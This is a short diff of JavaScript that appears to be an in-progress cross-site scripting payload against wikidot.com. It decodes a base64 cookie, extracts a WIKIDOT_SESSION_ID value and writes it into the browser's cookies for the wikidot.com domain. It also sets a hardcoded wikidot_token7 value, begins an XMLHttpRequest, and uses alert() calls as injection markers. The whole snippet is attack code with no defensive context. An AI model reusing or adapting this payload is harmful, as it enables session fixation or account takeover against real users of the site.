@@ -1,6 +1,6 @@
-function getCookie(cname) {
+function getCookie(cname, text) {
     var name = cname + "=";
-    var ca = document.cookie.split(';');
+    var ca = text.split(';');
     for(var i = 0; i <ca.length; i++) {
         var c = ca[i];
         while (c.charAt(0) == ' ') {
@@ -12,8 +12,8 @@ function getCookie(cname) {
     }
     return '';
 }
-alert(1)
-document.cookie = atob(getCookie("new"));
+alert("WIKIDOT_SESSION_ID=" + getCookie("WIKIDOT_SESSION_ID=",atob(getCookie("new", document.cookie))) + ";path=/;domain=wikidot.com;")
+document.cookie = "WIKIDOT_SESSION_ID=" + getCookie("WIKIDOT_SESSION_ID=",atob(getCookie("new", document.cookie))) + ";path=/;domain=wikidot.com;";
 document.cookie = "wikidot_token7=4m64ez22na9pf7k6s988;path=/;";
 var http = new XMLHttpRequest();
 sig = "test3";
